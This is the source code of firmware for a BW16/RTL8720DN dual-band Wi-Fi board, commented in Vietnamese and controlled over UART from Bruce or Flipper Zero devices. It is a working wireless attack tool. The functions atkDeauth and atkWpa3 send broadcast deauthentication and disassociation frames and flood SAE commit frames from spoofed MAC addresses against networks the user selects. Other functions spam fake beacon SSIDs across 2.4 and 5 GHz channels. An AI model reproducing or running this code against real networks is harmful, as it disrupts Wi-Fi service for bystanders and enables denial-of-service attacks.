/*
 * =========================================================================
 *  BW16 / RTL8720DN DUAL-BAND (2.4GHz + 5GHz) FIRMWARE FOR BRUCE & FLIPPER
 * =========================================================================
 * 
 *  SƠ ĐỒ NỐI CHÂN VỚI ESP32 (UART CROSS-WIRING):
 *  -------------------------------------------------------------
 *  Khuyên dùng Port 1 (Serial1 - Chân PB1 & PB2) vì không dính log boot ROM:
 *    ESP32 TX (ví dụ GPIO 21, 4, 11...)  --->  BW16 RX1 (Chân PB2 / D5)
 *    ESP32 RX (ví dụ GPIO 22, 5, 12...)  <---  BW16 TX1 (Chân PB1 / D4)
 *    GND                                <---> GND
 *    VCC (3.3V hoặc 5V)                 <---> 3.3V hoặc 5V
 * 
 *  Nếu dùng Port 0 (Serial / Log UART - Chân PA7 & PA8):
 *    ESP32 TX                            --->  BW16 RX0 (Chân PA8 / D1)
 *    ESP32 RX                            <---  BW16 TX0 (Chân PA7 / D0)
 *    GND                                <---> GND
 * 
 *  * LƯU Ý: Hai bo mạch giao tiếp UART bắt buộc chéo chân:
 *    TX của ESP32  ==>  RX của BW16 (PB2)
 *    RX của ESP32  <==  TX của BW16 (PB1)
 * =========================================================================
 */

#include <WiFi.h>
#include "wifi_cust_tx.h" 
#include "wifi_conf.h"
#include "wifi_util.h"

// --- CẤU HÌNH ---
#define MAX_NETWORKS 50       
#define MAX_TARGETS 10 
#define BAUD 115200

// --- LED PINS TRÊN BW16 ---
#define PIN_LED_R 12  
#define PIN_LED_G 10  
#define PIN_LED_B 11  

// --- ENUMS ---
enum LedState { LED_OFF, LED_BLUE_SOLID, LED_GREEN_WAIT, LED_RED_BLINK };
enum AttackType { ATK_NONE, ATK_DEAUTH, ATK_WPA3, ATK_BEACON_RANDOM, ATK_BEACON_RICKROLL };

LedState currentLedState = LED_OFF;
AttackType currentAttack = ATK_NONE;
unsigned long ledTimer = 0;       
unsigned long scanDoneTime = 0;   
unsigned long packetTimer = 0; 
unsigned long scanHeartbeatTimer = 0;

struct NetworkInfo {
  char ssid[33];
  uint8_t bssid[6];     
  int channel;
  int rssi;
  int security; 
};

NetworkInfo scanResults[MAX_NETWORKS]; 
int scanCount = 0;                     

int selectedTargets[MAX_TARGETS]; 
int selectedCount = 0;

volatile bool isScanning = false;
volatile bool scanDoneTrigger = false; 
String serialBuffer0 = "";
String serialBuffer1 = "";
static int cachedChannel = -1;

// Rickroll SSIDs from delfyRTL
const char* rick_roll[8] = {
  "01 Never gonna give you up",
  "02 Never gonna let you down",
  "03 Never gonna run around",
  "04 and desert you",
  "05 Never gonna make you cry",
  "06 Never gonna say goodbye",
  "07 Never gonna tell a lie",
  "08 and hurt you"
};

const int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
const int totalChannels = 19;

// --- DUAL UART HELPER (Truyền đồng thời cả Port 0 và Port 1) ---
void uartPrint(const String &s) {
  Serial.print(s);
  Serial1.print(s);
}

void uartPrintln(const String &s) {
  Serial.println(s);
  Serial1.println(s);
}

void uartPrintln() {
  Serial.println();
  Serial1.println();
}

// --- LED CONTROL ---
void setLedColor(bool r, bool g, bool b) {
  digitalWrite(PIN_LED_R, r ? HIGH : LOW);
  digitalWrite(PIN_LED_G, g ? HIGH : LOW);
  digitalWrite(PIN_LED_B, b ? HIGH : LOW);
}

void handleLedEffects() {
  unsigned long currentMillis = millis();
  switch (currentLedState) {
    case LED_OFF: setLedColor(0, 0, 0); break;
    case LED_BLUE_SOLID: setLedColor(0, 0, 1); break;
    case LED_GREEN_WAIT: 
      setLedColor(0, 1, 0); 
      if (currentMillis - scanDoneTime > 3000) currentLedState = LED_OFF;
      break;
    case LED_RED_BLINK:
      if ((currentMillis - ledTimer) > 100) {
        ledTimer = currentMillis;
        static bool toggle = false;
        toggle = !toggle;
        setLedColor(toggle, 0, 0); 
      }
      break;
  }
}

// --- SCAN HANDLER ---
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete != RTW_TRUE) {
    if (scanCount >= MAX_NETWORKS) return RTW_SUCCESS;
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0; 

    NetworkInfo net;
    strncpy(net.ssid, (const char*)record->SSID.val, 32);
    net.ssid[32] = '\0'; 
    net.channel = record->channel;
    net.rssi = record->signal_strength;
    net.security = record->security;
    memcpy(net.bssid, record->BSSID.octet, 6);

    bool exists = false;
    for (int i = 0; i < scanCount; i++) {
      if (memcmp(scanResults[i].bssid, net.bssid, 6) == 0) { exists = true; break; }
    }
    if (!exists) {
      scanResults[scanCount] = net;
      scanCount++;
    }
  } else {
    isScanning = false;
    scanDoneTrigger = true; 
  }
  return RTW_SUCCESS;
}

String getEncString(int sec) {
  if (sec == RTW_SECURITY_OPEN) return "OPEN";
  if (sec & RTW_SECURITY_WEP_PSK) return "WEP";
#ifdef RTW_SECURITY_WPA3_SAE
  if (sec & RTW_SECURITY_WPA3_SAE) return "WPA3";
#endif
#ifdef RTW_SECURITY_WPA3_AES_PSK
  if (sec & RTW_SECURITY_WPA3_AES_PSK) return "WPA3";
#endif
  if (sec & RTW_SECURITY_WPA2_AES_PSK) return "WPA2";
  if (sec & RTW_SECURITY_WPA_AES_PSK) return "WPA";
  return "UNK";
}

void startScan() {
  currentAttack = ATK_NONE; 
  currentLedState = LED_BLUE_SOLID; // Sáng đèn xanh dương khi đang quét
  scanCount = 0; 
  selectedCount = 0; 
  isScanning = true; 
  scanDoneTrigger = false;
  scanHeartbeatTimer = millis();
  wifi_scan_networks(scanResultHandler, NULL);
  uartPrintln("[SCAN STARTED...]");
}

void setup() {
  // 1. Mở Port 0 (PA7 TX / PA8 RX)
  Serial.begin(BAUD);

  // 2. Mở Port 1 (PB1 TX / PB2 RX) - Khuyên dùng nối ESP32 vì sạch log boot
  Serial1.begin(BAUD);

  pinMode(PIN_LED_R, OUTPUT); 
  pinMode(PIN_LED_G, OUTPUT); 
  pinMode(PIN_LED_B, OUTPUT);
  setLedColor(0, 0, 0);
  
  wifi_on(RTW_MODE_STA); 
  uartPrintln("\n[BW16 MULTI-TARGET READY]");
  uartPrintln("[UART: Serial0 (PA7/PA8) & Serial1 (PB1/PB2) ACTIVE]");

  delay(500);
  startScan(); 
}

// --- ATTACK LOGIC ---
void setTargetChannel(int ch) {
  if (cachedChannel != ch) {
    wext_set_channel("wlan0", ch);
    cachedChannel = ch;
  }
}

void atkDeauth() {
  static int currentTargetIdx = 0;
  
  if (selectedCount == 0) return;
  if (currentTargetIdx >= selectedCount) currentTargetIdx = 0;
  
  int targetID = selectedTargets[currentTargetIdx];
  if (targetID < 0 || targetID >= scanCount) {
    currentTargetIdx++;
    return;
  }
  
  NetworkInfo target = scanResults[targetID];
  setTargetChannel(target.channel);

  // Phát deauth frame với broadcast và reason 2 & 7
  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2); 
  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 7); 
  // Disassociation frame
  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
  
  currentTargetIdx++;
}

void atkWpa3() {
  static int currentTargetIdx = 0;
  static uint8_t spoof_mac[6] = {0x02, 0x16, 0x88, 0x00, 0x00, 0x01};
  
  if (selectedCount == 0) return;
  if (currentTargetIdx >= selectedCount) currentTargetIdx = 0;
  
  int targetID = selectedTargets[currentTargetIdx];
  if (targetID < 0 || targetID >= scanCount) {
    currentTargetIdx++;
    return;
  }
  
  NetworkInfo target = scanResults[targetID];
  setTargetChannel(target.channel);

  // Sinh địa chỉ MAC ngẫu nhiên (locally administered)
  spoof_mac[3] = (uint8_t)rand();
  spoof_mac[4] = (uint8_t)rand();
  spoof_mac[5] = (uint8_t)rand();

  // 1. SAE Commit Authentication frame flood
  wifi_tx_sae_commit_frame(target.bssid, spoof_mac);

  // 2. Disassoc & Deauth frame với PMF reason 23
  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 23);

  currentTargetIdx++;
}

// Tấn công Beacon Random SSID (như trong RTL8720dn)
void atkBeaconRandom() {
  static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  char rand_ssid[17];
  int len = random(6, 15);
  for (int i = 0; i < len; i++) {
    rand_ssid[i] = charset[random(0, sizeof(charset) - 1)];
  }
  rand_ssid[len] = '\0';

  uint8_t rand_bssid[6];
  rand_bssid[0] = 0x02; // Local administered
  for (int i = 1; i < 6; i++) rand_bssid[i] = (uint8_t)random(0, 256);

  int ch = allChannels[random(0, totalChannels)];
  setTargetChannel(ch);

  for (int i = 0; i < 3; i++) {
    wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rand_ssid);
  }
}

// Tấn công Beacon Rickroll (8 câu hát lan tỏa trên các kênh)
void atkBeaconRickroll() {
  static int songIdx = 0;
  uint8_t rand_bssid[6];
  rand_bssid[0] = 0x02;
  rand_bssid[1] = 0x16;
  rand_bssid[2] = 0x88;
  for (int i = 3; i < 6; i++) rand_bssid[i] = (uint8_t)random(0, 256);

  int ch = (songIdx % 11) + 1;
  setTargetChannel(ch);

  wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rick_roll[songIdx]);
  songIdx = (songIdx + 1) % 8;
}

void handleAttack() {
  unsigned long interval = 8;
  if (currentAttack == ATK_WPA3) interval = 10;
  else if (currentAttack == ATK_BEACON_RANDOM || currentAttack == ATK_BEACON_RICKROLL) interval = 15;

  if (millis() - packetTimer < interval) return; 
  packetTimer = millis();

  if (currentAttack == ATK_DEAUTH) atkDeauth();
  else if (currentAttack == ATK_WPA3) atkWpa3();
  else if (currentAttack == ATK_BEACON_RANDOM) atkBeaconRandom();
  else if (currentAttack == ATK_BEACON_RICKROLL) atkBeaconRickroll();
}

void printScanResults() {
  uartPrintln("--- SCAN RESULTS ---");
  for (int i = 0; i < scanCount; i++) {
    String line = "[" + String(i + 1) + "]\t" +
                  String(scanResults[i].channel) + "\t" +
                  String(scanResults[i].rssi) + "\t" +
                  getEncString(scanResults[i].security) + "\t" +
                  String(scanResults[i].ssid);
    uartPrintln(line);
  }
  uartPrintln("--------------------");
}

void printRtlScanList() {
  for (int i = 0; i < scanCount; i++) {
    String line = "AP:" + String(i) + "|" + String(scanResults[i].ssid) + "|";
    for (int j = 0; j < 6; j++) {
      if (j > 0) line += ":";
      if (scanResults[i].bssid[j] < 0x10) line += "0";
      line += String(scanResults[i].bssid[j], HEX);
    }
    line += "|" + String(scanResults[i].channel) + "|" +
            String(scanResults[i].security) + "|" +
            String(scanResults[i].rssi);
    uartPrintln(line);
  }
}

// --- COMMAND PARSER (Tương thích cả Bruce OS lẫn Flipper Zero / RTL8720) ---
void processCommand(String cmd) {
  cmd.trim();
  if (cmd.length() == 0) return;
  
  // 1. Lệnh quét mạng (Bruce "sc" hoặc Flipper "SCAN")
  if (cmd == "sc" || cmd.startsWith("SCAN")) {
    startScan();
  }
  // 2. Lệnh chọn mục tiêu Bruce ("sl:1,2,3")
  else if (cmd.startsWith("sl:")) {
    currentAttack = ATK_NONE;
    selectedCount = 0; 
    
    String nums = cmd.substring(3);
    char *token = strtok((char*)nums.c_str(), ",");
    while (token != NULL && selectedCount < MAX_TARGETS) {
      int id = atoi(token);
      if (id > 0 && id <= scanCount) {
        selectedTargets[selectedCount] = id - 1; 
        selectedCount++;
      }
      token = strtok(NULL, ",");
    }
    
    if (selectedCount > 0) {
      currentLedState = LED_BLUE_SOLID;
      uartPrintln("[SELECTED " + String(selectedCount) + " TARGETS]");
    }
  }
  // 3. Lệnh chọn mục tiêu Flipper ("DEAUTH:0" hoặc "DEAUTH:ALL")
  else if (cmd.startsWith("DEAUTH:")) {
    String targetStr = cmd.substring(7);
    selectedCount = 0;
    if (targetStr == "ALL") {
      for (int i = 0; i < scanCount && i < MAX_TARGETS; i++) {
        selectedTargets[selectedCount++] = i;
      }
    } else {
      int id = targetStr.toInt();
      if (id >= 0 && id < scanCount) {
        selectedTargets[selectedCount++] = id;
      }
    }
    if (selectedCount > 0) {
      currentAttack = ATK_DEAUTH;
      currentLedState = LED_RED_BLINK;
      cachedChannel = -1;
      uartPrintln("[ATTACK STARTED: DEAUTH]");
    }
  }
  // 4. Lệnh tấn công từ Bruce ("atk:...")
  else if (cmd.startsWith("atk:")) {
    String type = cmd.substring(4);
    if ((type == "deauth" || type == "flood") && selectedCount > 0) { 
      currentAttack = ATK_DEAUTH; 
      currentLedState = LED_RED_BLINK; 
      cachedChannel = -1;
      uartPrintln("[ATTACK STARTED: DEAUTH]");
    } 
    else if (type == "wpa3" && selectedCount > 0) {
      currentAttack = ATK_WPA3;
      currentLedState = LED_RED_BLINK;
      cachedChannel = -1;
      uartPrintln("[ATTACK STARTED: WPA3]");
    }
    else if (type == "beacon" || type == "random") {
      currentAttack = ATK_BEACON_RANDOM;
      currentLedState = LED_RED_BLINK;
      cachedChannel = -1;
      uartPrintln("[ATTACK STARTED: BEACON RANDOM]");
    }
    else if (type == "rickroll") {
      currentAttack = ATK_BEACON_RICKROLL;
      currentLedState = LED_RED_BLINK;
      cachedChannel = -1;
      uartPrintln("[ATTACK STARTED: BEACON RICKROLL]");
    }
  }
  // 5. Lệnh Beacon từ RTL8720 / Flipper
  else if (cmd.startsWith("RANDOM") || cmd.startsWith("BEACON:RANDOM")) {
    currentAttack = ATK_BEACON_RANDOM;
    currentLedState = LED_RED_BLINK;
    cachedChannel = -1;
    uartPrintln("[ATTACK STARTED: BEACON RANDOM]");
  }
  else if (cmd.startsWith("RICKROLL") || cmd.startsWith("BEACON:RICKROLL")) {
    currentAttack = ATK_BEACON_RICKROLL;
    currentLedState = LED_RED_BLINK;
    cachedChannel = -1;
    uartPrintln("[ATTACK STARTED: BEACON RICKROLL]");
  }
  // 6. Kiểm tra kết nối (PING -> PONG)
  else if (cmd.startsWith("PING")) {
    uartPrintln("PONG");
  }
  // 7. Lấy danh sách kiểu RTL8720
  else if (cmd.startsWith("LIST")) {
    printRtlScanList();
  }
  // 8. Dừng tấn công (Bruce "stop", "st" hoặc Flipper "STOP")
  else if (cmd == "stop" || cmd == "st" || cmd.startsWith("STOP")) {
    currentAttack = ATK_NONE;
    currentLedState = LED_OFF; 
    cachedChannel = -1;
    uartPrintln("[STOPPED]");
  }
}

void loop() {
  // Đọc từ Serial (Port 0: PA7/PA8)
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n') { 
      processCommand(serialBuffer0); 
      serialBuffer0 = ""; 
    } 
    else if (c != '\r') { 
      serialBuffer0 += c; 
    }
  }

  // Đọc từ Serial1 (Port 1: PB1/PB2 - khuyên dùng nối ESP32)
  while (Serial1.available()) {
    char c = (char)Serial1.read();
    if (c == '\n') { 
      processCommand(serialBuffer1); 
      serialBuffer1 = ""; 
    } 
    else if (c != '\r') { 
      serialBuffer1 += c; 
    }
  }

  // Heartbeat định kỳ khi đang scan để Bruce không timeout
  if (isScanning && (millis() - scanHeartbeatTimer > 1000)) {
    scanHeartbeatTimer = millis(); 
    uartPrintln("."); 
  }

  if (scanDoneTrigger) {
    scanDoneTrigger = false; 
    uartPrintln(""); 
    printScanResults();
    currentLedState = LED_GREEN_WAIT; 
    scanDoneTime = millis();
  }

  if (currentAttack != ATK_NONE) handleAttack();
  handleLedEffects();
}